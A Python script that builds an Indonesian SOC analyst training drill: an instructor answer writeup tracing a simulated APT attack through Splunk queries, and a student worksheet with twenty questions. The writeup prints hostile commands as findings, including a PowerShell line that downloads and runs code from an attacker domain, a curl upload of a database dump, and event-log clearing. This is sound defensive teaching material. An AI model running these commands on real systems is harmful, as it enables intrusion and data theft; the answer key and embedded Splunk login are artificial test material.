#!/usr/bin/env python3
"""
Generate all SOC Cyber Drill documents:
1. Writeup (Intended Solution) — for instructor
2. Student Worksheet — take-home assignment for students
"""
from docx import Document
from docx.shared import Pt, RGBColor, Inches, Cm
from docx.enum.text import WD_ALIGN_PARAGRAPH
from docx.oxml.ns import qn

GREEN = RGBColor(0x1D, 0x9E, 0x75)
GRAY = RGBColor(0x47, 0x55, 0x69)
MUTED = RGBColor(0x64, 0x74, 0x8B)
RED = RGBColor(0xDC, 0x26, 0x26)

def setup_doc():
    doc = Document()
    s = doc.styles['Normal']
    s.font.name = 'Calibri'
    s.font.size = Pt(11)
    s.paragraph_format.space_after = Pt(4)
    for lv in range(1,4):
        doc.styles[f'Heading {lv}'].font.color.rgb = GREEN
    return doc

def add_title_page(doc, title, subtitle, extra_lines=None):
    for _ in range(3):
        doc.add_paragraph()
    t = doc.add_paragraph()
    t.alignment = WD_ALIGN_PARAGRAPH.CENTER
    r = t.add_run(title)
    r.font.size = Pt(28); r.font.color.rgb = GREEN; r.bold = True
    t2 = doc.add_paragraph()
    t2.alignment = WD_ALIGN_PARAGRAPH.CENTER
    r2 = t2.add_run(subtitle)
    r2.font.size = Pt(16); r2.font.color.rgb = GRAY
    doc.add_paragraph()
    if extra_lines:
        for line in extra_lines:
            p = doc.add_paragraph()
            p.alignment = WD_ALIGN_PARAGRAPH.CENTER
            p.add_run(line).font.size = Pt(11)
    doc.add_page_break()

def add_code(doc, text, label=None):
    if label:
        p = doc.add_paragraph()
        r = p.add_run(f'📋 {label}')
        r.bold = True; r.font.size = Pt(10)
    p = doc.add_paragraph()
    r = p.add_run(text)
    r.font.name = 'Consolas'
    r.font.size = Pt(9)
    r.font.color.rgb = GREEN

def add_finding(doc, text):
    p = doc.add_paragraph()
    r = p.add_run('🔍 Finding: ')
    r.bold = True
    p.add_run(text)

def add_mitre(doc, text):
    p = doc.add_paragraph()
    r = p.add_run('🎯 MITRE ATT&CK: ')
    r.bold = True; r.font.color.rgb = RED
    p.add_run(text)

def add_table(doc, headers, rows):
    t = doc.add_table(rows=1, cols=len(headers))
    t.style = 'Light Grid Accent 1'
    for i, h in enumerate(headers):
        t.rows[0].cells[i].text = h
    for row in rows:
        cells = t.add_row().cells
        for i, val in enumerate(row):
            cells[i].text = str(val)

# ═══════════════════════════════════════════════════════
# DOCUMENT 1: WRITEUP (Intended Solution)
# ═══════════════════════════════════════════════════════
def create_writeup():
    doc = setup_doc()
    add_title_page(doc, 'SOC Cyber Drill', 'Intended Solution Writeup', [
        'PT Nusantara Digital — APT Attack Investigation',
        'JagoanSiber · SOC Analyst Training',
        'April 2026 | CONFIDENTIAL — Instructor Only'
    ])

    # ── SCENARIO ──
    doc.add_heading('Scenario Background', level=1)
    doc.add_paragraph(
        'PT Nusantara Digital adalah perusahaan teknologi di Jakarta yang baru saja meng-hire SOC team. '
        'Pada minggu pertama operasional SOC, SIEM (Splunk) mendeteksi beberapa anomali yang perlu diinvestigasi.'
    )
    doc.add_paragraph(
        'Sebagai SOC analyst, kamu diminta untuk menginvestigasi log selama 3 hari (7-9 April 2026) dan '
        'menentukan: apakah ada serangan? Jika ya, bagaimana kronologinya, apa dampaknya, dan apa yang harus dilakukan?'
    )
    doc.add_paragraph(
        'Spoiler: Ini adalah serangan APT (Advanced Persistent Threat) dengan full kill chain — '
        'dari reconnaissance sampai data exfiltration. Writeup ini menjelaskan langkah-langkah investigasi secara detail.'
    )

    doc.add_heading('Network Environment', level=2)
    add_table(doc, ['Hostname', 'IP Address', 'OS / Role'], [
        ('FW-EDGE-01', '203.0.113.1 / 10.10.0.1', 'Palo Alto — Edge Firewall'),
        ('WEB-SERVER-01', '10.10.1.10', 'Ubuntu 22.04 — Apache Web Server (DMZ)'),
        ('WS-FINANCE-01', '10.10.2.50', 'Windows 11 — Finance Workstation'),
        ('WS-HR-02', '10.10.2.51', 'Windows 11 — HR Workstation'),
        ('DC-01', '10.10.3.10', 'Windows Server 2022 — Domain Controller'),
        ('DB-SERVER-01', '10.10.3.20', 'Ubuntu 22.04 — MySQL Database'),
    ])

    doc.add_heading('Attacker Infrastructure', level=2)
    add_table(doc, ['IP / Domain', 'Role', 'GeoIP'], [
        ('91.215.85.142', 'Scanner / Recon', 'Romania'),
        ('185.234.216.88 / dl.techsupport-cdn.net', 'Payload Staging + Exfiltration', 'Russia'),
        ('45.77.65.211 / update-service.cloud', 'Command & Control (C2)', 'Netherlands'),
    ])

    doc.add_page_break()

    # ── INVESTIGATION ──
    doc.add_heading('Investigation — Step by Step', level=1)
    doc.add_paragraph(
        'Investigasi disusun mengikuti alur kronologis serangan. Setiap step mencakup: '
        'konteks → SPL query → temuan → penjelasan → MITRE ATT&CK mapping.'
    )

    # STEP 1
    doc.add_heading('Phase 1: Reconnaissance (Day 1, ~09:15)', level=2)
    doc.add_paragraph(
        'Investigasi dimulai dari Suricata IDS alerts. Di SOC, IDS alerts biasanya jadi starting point '
        'karena ini deteksi paling awal terhadap aktivitas mencurigakan.'
    )
    doc.add_heading('1.1 Port Scan Detection', level=3)
    doc.add_paragraph(
        'Langkah pertama: cari alert bertipe scan di Suricata. Ini akan menunjukkan apakah ada '
        'reconnaissance activity terhadap infrastruktur kita.'
    )
    add_code(doc, 'index=ids "ET SCAN" | stats count by src_ip alert.signature dest_port', 'Splunk Query')
    add_finding(doc, 'IP 91.215.85.142 melakukan port scan terhadap WEB-SERVER-01. 18 port di-scan termasuk '
                'SSH (22), HTTP (80), HTTPS (443), SMB (445), MySQL (3306), RDP (3389). Semua DENIED oleh firewall.')
    doc.add_paragraph(
        'Corroborate dengan firewall log untuk memastikan scan memang diblok:'
    )
    add_code(doc, 'index=firewall 91.215.85.142 | stats count by action dest_port | sort dest_port', 'Corroborate — Firewall')
    
    doc.add_heading('1.2 Web Vulnerability Scanning', level=3)
    doc.add_paragraph(
        'Scanner yang sama juga mencoba web vulnerability scanning terhadap Apache web server.'
    )
    add_code(doc, 'index=ids src_ip=91.215.85.142 event_type=alert NOT "ET SCAN" | stats count by alert.signature', 'Splunk Query')
    add_finding(doc, 'SQL Injection attempts (UNION SELECT, SELECT FROM), XSS, dan Directory Traversal terdeteksi. '
                'Apache access log menunjukkan semua request mendapat 404/400 — scanner GAGAL menemukan vulnerability.')
    add_code(doc, 'index=web 91.215.85.142 | stats count by status uri_path', 'Corroborate — Apache')
    add_mitre(doc, 'T1595 — Active Scanning, T1190 — Exploit Public-Facing Application (attempted)')
    doc.add_paragraph(
        '💡 Insight untuk peserta: Scanner gagal, tapi ini bukan akhir cerita. Attacker yang skilled akan '
        'beralih ke vektor lain. Perhatikan bahwa recon terjadi JAM 9 PAGI — dan serangan berikutnya '
        'terjadi jam 2 siang hari yang sama. Ada jeda 5 jam — kemungkinan attacker menyiapkan phishing campaign.'
    )

    doc.add_page_break()

    # STEP 2
    doc.add_heading('Phase 2: Initial Access — Phishing (Day 1, 14:47)', level=2)
    doc.add_paragraph(
        'Setelah web scanning gagal, attacker mengirim phishing email ke user di finance department. '
        'Email-nya tidak ada di log (karena kita tidak punya email gateway logs), tapi EFEK dari phishing '
        'terlihat jelas di Sysmon.'
    )
    doc.add_heading('2.1 Malicious Document Execution', level=3)
    doc.add_paragraph(
        'Cari proses yang di-spawn oleh Microsoft Word — ini pattern klasik malicious macro:'
    )
    add_code(doc, 'index=sysmon EventID=1 ParentImage="*WINWORD*"\n| table _time Computer Image CommandLine User ParentImage ParentCommandLine', 'Splunk Query')
    add_finding(doc, 
        'User ratna.finance di WS-FINANCE-01 membuka file "Invoice_Q1_2026.docm". '
        'Macro di dalam dokumen menjalankan: WINWORD.EXE → cmd.exe → powershell.exe -enc [Base64]')
    doc.add_paragraph(
        'Ini adalah attack chain klasik: user buka dokumen → macro jalan otomatis → spawn cmd → jalankan PowerShell. '
        'Proses chain WINWORD → cmd → powershell TIDAK PERNAH terjadi di operasi normal.'
    )

    doc.add_heading('2.2 PowerShell Downloader', level=3)
    add_code(doc, 'index=sysmon EventID=1 Image="*powershell*" CommandLine="*enc*"\n| table _time CommandLine User', 'Splunk Query')
    doc.add_paragraph(
        'Base64 decode dari parameter -enc menunjukkan:')
    add_code(doc, "IEX (New-Object Net.WebClient).DownloadString('https://dl.techsupport-cdn.net/update.exe')", 'Decoded Base64')
    add_finding(doc, 'PowerShell mendownload malicious payload dari domain attacker (dl.techsupport-cdn.net → 185.234.216.88).')

    doc.add_heading('2.3 Payload Dropped', level=3)
    add_code(doc, 'index=sysmon EventID=11 TargetFilename="*svchost_update*"\n| table _time Computer TargetFilename Hashes', 'Splunk Query')
    add_finding(doc, 'File malicious di-drop ke: C:\\Users\\ratna.finance\\AppData\\Local\\Temp\\svchost_update.exe. '
                'Nama file dibuat mirip svchost.exe (Windows system process) untuk menghindari deteksi visual.')
    add_mitre(doc, 'T1566.001 (Phishing Attachment), T1059.001 (PowerShell), T1204.002 (User Execution), T1027 (Obfuscated Files)')

    doc.add_page_break()

    # STEP 3
    doc.add_heading('Phase 3: Command & Control (Day 1, 14:49 — ongoing)', level=2)
    doc.add_paragraph(
        'Setelah payload dieksekusi, malware membuat koneksi ke C2 server. Ini adalah "jembatan" '
        'yang memungkinkan attacker mengontrol mesin korban secara remote.'
    )
    doc.add_heading('3.1 C2 Connection', level=3)
    add_code(doc, 'index=sysmon EventID=3 Image="*svchost_update*"\n| table _time DestinationIp DestinationPort Image', 'Splunk Query')
    add_finding(doc, 'svchost_update.exe membuat koneksi ke 45.77.65.211:443 (HTTPS). C2 menggunakan HTTPS supaya traffic blend in dengan web browsing normal.')

    doc.add_heading('3.2 DNS Resolution', level=3)
    add_code(doc, 'index=dns ("update-service.cloud" OR "techsupport-cdn")\n| table _time src_ip domain answer', 'Splunk Query')
    add_finding(doc, 'Dua domain suspicious: update-service.cloud (C2) dan dl.techsupport-cdn.net (staging). '
                'Keduanya di-resolve dari WS-FINANCE-01.')

    doc.add_heading('3.3 Beacon Pattern Analysis', level=3)
    doc.add_paragraph('Ini salah satu teknik hunting yang paling powerful — cari pola reguler di koneksi keluar:')
    add_code(doc, 'index=firewall dest_ip=45.77.65.211 | timechart count span=5m', 'Splunk Query — Timechart')
    add_code(doc, 'index=firewall 45.77.65.211 | stats count', 'Count Total')
    add_finding(doc, '~3,071 koneksi selama 3 hari. Interval: setiap ~60 detik. Ini adalah BEACON PATTERN — '
                'signature khas C2 communication. Traffic normal tidak pernah seteratur ini.')
    add_mitre(doc, 'T1071.001 (Web Protocols C2)')

    doc.add_page_break()

    # STEP 4
    doc.add_heading('Phase 4: Discovery & Credential Access (Day 2, 09:10-09:15)', level=2)
    doc.add_paragraph(
        'Hari kedua, attacker mulai menjelajahi environment melalui C2 channel.'
    )
    doc.add_heading('4.1 Discovery Commands', level=3)
    add_code(doc, 'index=sysmon EventID=1 Computer="WS-FINANCE-01*"\n  (Image="*whoami*" OR Image="*ipconfig*" OR Image="*net.exe*" OR Image="*nltest*" OR Image="*systeminfo*")\n| table _time Image CommandLine', 'Splunk Query')
    add_finding(doc, '5 discovery commands dijalankan dalam 1 menit: whoami /all, ipconfig /all, '
                'net group "Domain Admins" /domain, nltest /domain_trusts, systeminfo. '
                'Attacker sedang mapping environment — siapa usernya, ada di domain mana, siapa admin-nya.')

    doc.add_heading('4.2 Credential Dumping (Mimikatz)', level=3)
    add_code(doc, 'index=sysmon EventID=10 TargetImage="*lsass*"\n| table _time Computer SourceImage TargetImage GrantedAccess', 'Splunk Query')
    add_finding(doc, 'PowerShell mengakses LSASS process (GrantedAccess: 0x1010). Ini adalah signature Mimikatz — '
                'tool paling populer untuk mencuri credentials dari memory Windows.')
    add_mitre(doc, 'T1082 (System Info Discovery), T1069.002 (Domain Groups), T1003.001 (LSASS Memory)')

    doc.add_page_break()

    # STEP 5
    doc.add_heading('Phase 5: Lateral Movement (Day 2, 09:20-09:25)', level=2)
    doc.add_paragraph(
        'Dengan credentials yang dicuri, attacker bergerak ke sistem lain.'
    )
    doc.add_heading('5.1 Pass-the-Hash ke Domain Controller', level=3)
    add_code(doc, 'index=windows EventCode=4624 LogonType=3 10.10.2.50 host="DC-01*"\n| table _time src_ip Account_Name LogonType', 'Splunk Query')
    add_finding(doc, 'Network logon (type 3) dari WS-FINANCE-01 ke DC-01 menggunakan NTLM authentication. '
                'Di domain environment modern, NTLM seharusnya jarang dipakai (harusnya Kerberos). '
                'NTLM dari workstation ke DC = strong indicator Pass-the-Hash.')
    add_code(doc, 'index=windows EventCode=4672 host="DC-01*" ratna.finance\n| table _time Account_Name Privileges', 'Privilege Verification')
    add_finding(doc, 'EventCode 4672 confirm: ratna.finance mendapat ADMIN privileges di DC-01 — SeDebugPrivilege, SeBackupPrivilege, dll.')

    doc.add_heading('5.2 SSH ke Database Server', level=3)
    add_code(doc, 'index=linux sourcetype=syslog "Accepted" 10.10.2.50\n| table _time host', 'Splunk Query')
    add_finding(doc, 'SSH login dari 10.10.2.50 (WS-FINANCE-01) ke DB-SERVER-01 sebagai root menggunakan password. '
                'Windows workstation → SSH ke Linux DB server = sangat anomalous. Finance user tidak seharusnya SSH ke database.')
    add_mitre(doc, 'T1550.002 (Pass the Hash), T1021.004 (Remote Services: SSH)')

    doc.add_page_break()

    # STEP 6
    doc.add_heading('Phase 6: Persistence (Day 2, 09:22-09:30)', level=2)
    doc.add_paragraph(
        'Attacker membuat "pintu belakang" supaya tetap punya akses meskipun malware dihapus.'
    )
    doc.add_heading('6.1 Backdoor Account', level=3)
    add_code(doc, 'index=windows EventCode=4720\n| table _time host Account_Name Target_Account_Name', 'User Created (4720)')
    add_code(doc, 'index=windows EventCode=4728 Group_Name="Domain Admins"\n| table _time host Member_Name Group_Name', 'Added to Domain Admins (4728)')
    add_finding(doc, 'Account "svc_backup" dibuat di DC-01 oleh ratna.finance, lalu ditambahkan ke Domain Admins. '
                'Nama "svc_backup" dipilih supaya terlihat seperti service account yang legitimate.')

    doc.add_heading('6.2 Scheduled Task', level=3)
    add_code(doc, 'index=sysmon EventID=1 Image="*schtasks*"\n| table _time Computer CommandLine', 'Schtasks Command')
    add_code(doc, 'index=windows EventCode=4698\n| table _time host Task_Name', 'Task Created (4698)')
    add_finding(doc, 'Scheduled task "\\Microsoft\\Windows\\Maintenance\\SystemUpdate" dibuat — menjalankan svchost_update.exe '
                '(malware) setiap hari jam 09:00 sebagai SYSTEM. Bahkan kalau file dihapus, task akan tetap coba jalan.')
    add_mitre(doc, 'T1136.002 (Create Account), T1078.002 (Domain Accounts), T1053.005 (Scheduled Task)')

    doc.add_page_break()

    # STEP 7
    doc.add_heading('Phase 7: Collection & Exfiltration (Day 2-3)', level=2)
    doc.add_paragraph('Ini tujuan akhir attacker — mencuri data.')

    doc.add_heading('7.1 Database Dump (Day 2, 14:00)', level=3)
    add_code(doc, 'index=linux sourcetype=linux_audit (comm="mysqldump" OR comm="tar" OR comm="curl")\n| sort _time\n| table _time host comm exe', 'Splunk Query — All Collection Steps')
    add_finding(doc, '3 langkah berurutan:\n'
                '  1) mysqldump --all-databases → dump seluruh database MySQL\n'
                '  2) tar czf /tmp/bak.tar.gz → compress dump jadi ~250MB\n'
                '  3) curl POST upload ke 185.234.216.88 → kirim ke server attacker')

    doc.add_heading('7.2 Exfiltration Evidence (Day 3, 02:30)', level=3)
    add_code(doc, 'index=firewall dest_ip=185.234.216.88\n| table _time src_ip dest_ip bytes_sent bytes_received', 'Firewall — Large Transfer')
    add_finding(doc, '~250 MB data dikirim dari DB-SERVER-01 ke 185.234.216.88 pada jam 02:30 WIB — '
                'sengaja dilakukan after hours supaya tidak terdeteksi oleh analyst shift pagi.')
    add_mitre(doc, 'T1005 (Data from Local System), T1041 (Exfiltration Over C2 Channel)')

    doc.add_page_break()

    # STEP 8
    doc.add_heading('Phase 8: Defense Evasion (Day 3, 02:35-02:40)', level=2)
    doc.add_paragraph('Setelah data dikirim, attacker mencoba menghapus jejak.')

    doc.add_heading('8.1 File Cleanup', level=3)
    add_code(doc, 'index=linux sourcetype=linux_audit comm="rm"\n| table _time host', 'Splunk Query')
    add_finding(doc, 'rm -f /tmp/bak.tar.gz — file dump yang sudah dikirim dihapus dari DB server.')

    doc.add_heading('8.2 Event Log Cleared', level=3)
    add_code(doc, 'index=windows EventCode=1102\n| table _time host Account_Name', 'Log Cleared (1102)')
    add_code(doc, 'index=sysmon EventID=1 Image="*wevtutil*"\n| table _time Computer CommandLine', 'Wevtutil Command')
    add_finding(doc, 'Security event log di WS-FINANCE-01 di-clear menggunakan "wevtutil cl Security". '
                'Ironi: event 1102 (log cleared) tetap tercatat karena itu adalah event TERAKHIR sebelum log di-clear. '
                'Ini mengapa event 1102 harus selalu di-alert — hampir selalu indikasi malicious activity.')
    add_mitre(doc, 'T1070.001 (Clear Event Logs), T1070.004 (File Deletion)')

    doc.add_page_break()

    # IOC TABLE
    doc.add_heading('IOC Summary', level=1)
    add_table(doc, ['Type', 'Value', 'Context'], [
        ('IP', '91.215.85.142', 'Recon scanner (Romania)'),
        ('IP', '185.234.216.88', 'Payload staging + exfil destination (Russia)'),
        ('IP', '45.77.65.211', 'C2 server (Netherlands)'),
        ('Domain', 'update-service.cloud', 'C2 domain'),
        ('Domain', 'dl.techsupport-cdn.net', 'Payload download'),
        ('SHA256', 'a1b2c3d4e5f6...', 'Malicious payload hash'),
        ('File', 'C:\\...\\Temp\\svchost_update.exe', 'Dropped malware'),
        ('File', '/tmp/bak.tar.gz', 'Staged exfil data'),
        ('User', 'svc_backup', 'Backdoor Domain Admin'),
        ('Task', '...\\Maintenance\\SystemUpdate', 'Persistence mechanism'),
    ])

    doc.add_page_break()

    # MITRE
    doc.add_heading('MITRE ATT&CK Summary', level=1)
    add_table(doc, ['Phase', 'Tactic', 'Technique ID', 'Evidence'], [
        ('1', 'Reconnaissance', 'T1595', 'Suricata scan alerts'),
        ('2', 'Initial Access', 'T1566.001', 'WINWORD→cmd→powershell'),
        ('3', 'Execution', 'T1059.001', 'Encoded PowerShell'),
        ('4', 'C2', 'T1071.001', 'HTTPS beacon to 45.77.65.211'),
        ('5', 'Discovery', 'T1082', 'whoami, ipconfig, net group'),
        ('6', 'Credential Access', 'T1003.001', 'LSASS memory access'),
        ('7', 'Lateral Movement', 'T1550.002', 'NTLM Pass-the-Hash to DC'),
        ('8', 'Lateral Movement', 'T1021.004', 'SSH to DB server'),
        ('9', 'Persistence', 'T1136.002', 'svc_backup account created'),
        ('10', 'Persistence', 'T1053.005', 'Scheduled task'),
        ('11', 'Collection', 'T1005', 'mysqldump'),
        ('12', 'Exfiltration', 'T1041', 'curl upload 250MB'),
        ('13', 'Defense Evasion', 'T1070.001', 'Event log cleared'),
        ('14', 'Defense Evasion', 'T1070.004', 'File deleted'),
    ])

    doc.add_page_break()

    # RESPONSE
    doc.add_heading('Recommended Immediate Response', level=1)
    steps = [
        'Disable account "svc_backup" dan force reset password "ratna.finance"',
        'Isolate WS-FINANCE-01 dan DB-SERVER-01 dari network',
        'Block IP: 45.77.65.211, 185.234.216.88, 91.215.85.142 di firewall',
        'Block domain: update-service.cloud, dl.techsupport-cdn.net di DNS/proxy',
        'Remove scheduled task "SystemUpdate" dari WS-FINANCE-01',
        'Delete malware: svchost_update.exe',
        'Force password reset ALL Domain Admin accounts',
        'Full malware scan semua endpoint',
        'Notify legal/compliance — potential data breach (customer database)',
        'Post-incident review: update detection rules, phishing awareness training',
    ]
    for i, s in enumerate(steps, 1):
        doc.add_paragraph(f'{i}. {s}')

    doc.save("/mnt/d/cheatsheet-blue-team/dataset/SOC_Cyber_Drill_Writeup.docx")
    print("✅ Writeup saved")

# ═══════════════════════════════════════════════════════
# DOCUMENT 2: STUDENT WORKSHEET
# ═══════════════════════════════════════════════════════
def create_worksheet():
    doc = setup_doc()
    add_title_page(doc, 'SOC Cyber Drill', 'Student Worksheet', [
        'PT Nusantara Digital — Incident Investigation',
        'JagoanSiber · SOC Analyst Training',
        'April 2026',
        '',
        'Nama: ________________________________',
        'Tanggal: ______________________________',
    ])

    # ── SCENARIO ──
    doc.add_heading('Scenario', level=1)
    doc.add_paragraph(
        'Kamu baru saja bergabung sebagai SOC Analyst di PT Nusantara Digital, sebuah perusahaan teknologi '
        'di Jakarta. PT Nusantara Digital memiliki infrastruktur IT yang terdiri dari beberapa server dan '
        'workstation yang terhubung ke internet melalui firewall Palo Alto.'
    )
    doc.add_paragraph(
        'Pada Senin pagi (7 April 2026), SOC Manager menginformasikan bahwa ada beberapa alert dari '
        'IDS (Intrusion Detection System) yang perlu diinvestigasi. Selain itu, ada laporan dari HR bahwa '
        'seorang karyawan di departemen finance menerima email mencurigakan pada hari yang sama.'
    )
    doc.add_paragraph(
        'Kamu diminta untuk melakukan investigasi menyeluruh menggunakan Splunk SIEM. '
        'Log yang tersedia mencakup 3 hari: 7-9 April 2026. Tentukan apakah ada insiden keamanan, '
        'rekonstruksi kronologi serangan, identifikasi semua IOC (Indicator of Compromise), dan '
        'berikan rekomendasi response.'
    )

    doc.add_heading('Splunk Access', level=2)
    p = doc.add_paragraph()
    p.add_run('URL: ').bold = True
    p.add_run('http://141.94.36.151:8001\n')
    p.add_run('Login: ').bold = True
    p.add_run('admin / JagoanSiber2026\n')
    p.add_run('Time Range: ').bold = True
    p.add_run('Set ke "All time" di time picker')

    doc.add_heading('Available Log Sources', level=2)
    add_table(doc, ['Index', 'Sourcetype', 'Description'], [
        ('firewall', 'pan_traffic', 'Palo Alto firewall traffic (allow/deny)'),
        ('dns', 'pan_dns', 'DNS query logs'),
        ('ids', 'suricata', 'Suricata IDS alerts + network flow'),
        ('windows', 'WinEventLog', 'Windows Security Event Log'),
        ('sysmon', 'XmlWinEventLog', 'Sysmon (process, network, file events)'),
        ('linux', 'linux_audit, syslog', 'Linux auditd + syslog'),
        ('web', 'access_combined', 'Apache web server access logs'),
    ])

    doc.add_heading('Network Map', level=2)
    add_table(doc, ['Hostname', 'IP', 'Role'], [
        ('FW-EDGE-01', '203.0.113.1 / 10.10.0.1', 'Edge Firewall'),
        ('WEB-SERVER-01', '10.10.1.10', 'Web Server (DMZ)'),
        ('WS-FINANCE-01', '10.10.2.50', 'Finance Workstation'),
        ('WS-HR-02', '10.10.2.51', 'HR Workstation'),
        ('DC-01', '10.10.3.10', 'Domain Controller'),
        ('DB-SERVER-01', '10.10.3.20', 'Database Server'),
    ])

    doc.add_page_break()

    # ── OBJECTIVES ──
    doc.add_heading('Objectives', level=1)
    doc.add_paragraph('Selesaikan 20 pertanyaan berikut. Jawab berdasarkan hasil investigasi di Splunk.')
    doc.add_paragraph('Untuk setiap jawaban, sertakan:')
    doc.add_paragraph('1. SPL query yang kamu gunakan')
    doc.add_paragraph('2. Jawaban / temuan')
    doc.add_paragraph('3. Penjelasan singkat — kenapa ini penting?')

    doc.add_heading('Scoring', level=2)
    add_table(doc, ['Level', 'Questions', 'Points Each', 'Subtotal'], [
        ('🟢 Easy', 'Q1 — Q7', '3 pts', '21 pts'),
        ('🟡 Medium', 'Q8 — Q14', '5 pts', '35 pts'),
        ('🔴 Hard', 'Q15 — Q20', '8 pts', '48 pts'),
        ('', '', 'Total', '104 pts'),
    ])

    doc.add_page_break()

    # ── QUESTIONS WITH ANSWER TEMPLATE ──
    questions = [
        ('🟢 Easy', 'Reconnaissance', 'Di index "ids" (Suricata), ada alert bertipe "ET SCAN". Dari IP address mana serangan scanning ini berasal?', 'index=ids "ET SCAN"'),
        ('🟢 Easy', 'Reconnaissance', 'Berapa banyak port yang di-scan oleh attacker tersebut? Sebutkan minimal 5 port.', 'Filter berdasarkan IP attacker, lihat dest_port'),
        ('🟢 Easy', 'Reconnaissance', 'Selain port scan, attacker juga melakukan web vulnerability scanning. Jenis serangan web apa yang dicoba?', 'index=ids src_ip=[IP] "SQL" OR "Cross-Site"'),
        ('🟢 Easy', 'Reconnaissance', 'Apakah web scanning berhasil? Cek Apache access log — status code apa yang diterima attacker?', 'index=web [IP attacker]'),
        ('🟢 Easy', 'Initial Access', 'Di Sysmon, cari proses yang di-spawn oleh Microsoft Word (WINWORD.EXE). Host mana yang terinfeksi dan siapa user-nya?', 'index=sysmon EventID=1 ParentImage="*WINWORD*"'),
        ('🟢 Easy', 'Initial Access', 'Apa nama file dokumen yang dibuka oleh user? (Cek ParentCommandLine)', 'Cari ".doc" di ParentCommandLine'),
        ('🟢 Easy', 'Execution', 'PowerShell yang dijalankan menggunakan -enc (encoded). Apa yang dilakukan script tersebut?', 'index=sysmon EventID=1 Image="*powershell*" CommandLine="*enc*"'),
        ('🟡 Medium', 'C2', 'Payload membuat koneksi keluar. Ke IP dan port berapa? (Sysmon Event ID 3)', 'index=sysmon EventID=3 Image="*svchost_update*"'),
        ('🟡 Medium', 'C2', 'Domain apa yang digunakan untuk C2? Cari di DNS logs.', 'index=dns [C2 IP]'),
        ('🟡 Medium', 'C2', 'Berapa total koneksi C2 beacon selama 3 hari? Apakah ada pola waktu (beaconing)?', 'index=firewall dest_ip=[C2 IP] | timechart count span=5m'),
        ('🟡 Medium', 'Credential Access', 'Sysmon Event ID 10 mendeteksi akses ke proses sensitif. Proses apa yang diakses? Teknik apa ini?', 'index=sysmon EventID=10'),
        ('🟡 Medium', 'Lateral Movement', 'Cari logon type 3 dari WS-FINANCE-01 ke DC-01. Authentication package apa yang dipakai?', 'index=windows EventCode=4624 [IP] DC-01'),
        ('🟡 Medium', 'Lateral Movement', 'Cari SSH login mencurigakan ke DB-SERVER-01 di syslog.', 'index=linux sourcetype=syslog "Accepted"'),
        ('🟡 Medium', 'Discovery', 'Sebutkan minimal 3 perintah discovery yang dijalankan attacker di WS-FINANCE-01.', 'index=sysmon EventID=1 whoami OR ipconfig OR net.exe'),
        ('🔴 Hard', 'Persistence', 'Attacker membuat akun backdoor di DC. Nama akun dan group apa?', 'index=windows EventCode=4720 dan EventCode=4728'),
        ('🔴 Hard', 'Persistence', 'Apa nama scheduled task yang dibuat dan binary apa yang dijalankan?', 'index=sysmon Image="*schtasks*"'),
        ('🔴 Hard', 'Exfiltration', 'Data apa yang dicuri dari DB-SERVER-01? Jelaskan langkah-langkah exfiltration.', 'index=linux comm="mysqldump" OR comm="tar" OR comm="curl"'),
        ('🔴 Hard', 'Exfiltration', 'Berapa besar data yang diexfiltrate? (Cek firewall log ke IP staging)', 'index=firewall [staging IP]'),
        ('🔴 Hard', 'Defense Evasion', 'Dua teknik anti-forensics apa yang dilakukan? Sebutkan evidence-nya.', 'index=windows EventCode=1102 dan index=linux comm="rm"'),
        ('🔴 Hard', 'Timeline', 'FINAL: Susun timeline lengkap serangan dari awal sampai akhir dengan MITRE ATT&CK ID.', 'Gunakan semua jawaban sebelumnya'),
    ]

    # EXAMPLE ANSWER
    doc.add_heading('Contoh Format Jawaban', level=1)
    doc.add_paragraph('Berikut contoh cara menjawab (bukan jawaban sebenarnya):')
    doc.add_paragraph()
    p = doc.add_paragraph()
    p.add_run('Question: ').bold = True
    p.add_run('Di index firewall, berapa total event yang ada?')
    doc.add_paragraph()
    p2 = doc.add_paragraph()
    p2.add_run('SPL Query: ').bold = True
    add_code(doc, 'index=firewall | stats count')
    p3 = doc.add_paragraph()
    p3.add_run('Jawaban: ').bold = True
    p3.add_run('Total 18,241 events di index firewall.')
    p4 = doc.add_paragraph()
    p4.add_run('Penjelasan: ').bold = True
    p4.add_run('Firewall log berisi semua traffic yang melewati edge firewall, baik yang diizinkan (allow) maupun yang diblok (deny). Ini adalah sumber data utama untuk visibility traffic masuk dan keluar jaringan.')

    doc.add_page_break()

    # ── ALL 20 QUESTIONS ──
    doc.add_heading('Questions', level=1)
    for i, (level, cat, q, hint) in enumerate(questions, 1):
        doc.add_heading(f'Question {i}', level=2)
        p = doc.add_paragraph()
        r = p.add_run(f'{level}  |  {cat}')
        r.font.size = Pt(10); r.font.color.rgb = MUTED
        doc.add_paragraph(q)
        hp = doc.add_paragraph()
        hp.add_run('💡 Hint: ').bold = True
        hr = hp.add_run(hint)
        hr.font.color.rgb = MUTED; hr.font.size = Pt(10)

        doc.add_paragraph()
        doc.add_paragraph('SPL Query yang digunakan:')
        doc.add_paragraph('_' * 80)
        doc.add_paragraph()
        doc.add_paragraph('Jawaban:')
        doc.add_paragraph('_' * 80)
        doc.add_paragraph('_' * 80)
        doc.add_paragraph()
        doc.add_paragraph('Penjelasan:')
        doc.add_paragraph('_' * 80)
        doc.add_paragraph('_' * 80)
        doc.add_paragraph()

        if i < len(questions):
            if i % 3 == 0:
                doc.add_page_break()

    doc.save("/mnt/d/cheatsheet-blue-team/dataset/SOC_Cyber_Drill_Student_Worksheet.docx")
    print("✅ Student Worksheet saved")

# ─── MAIN ───────────────────────────────────────────────
if __name__ == "__main__":
    create_writeup()
    create_worksheet()
    print("\n📁 Files:")
    import os
    for f in ['SOC_Cyber_Drill_Writeup.docx', 'SOC_Cyber_Drill_Student_Worksheet.docx']:
        path = f"/mnt/d/cheatsheet-blue-team/dataset/{f}"
        size = os.path.getsize(path)
        print(f"  {f}: {size/1024:.0f} KB")
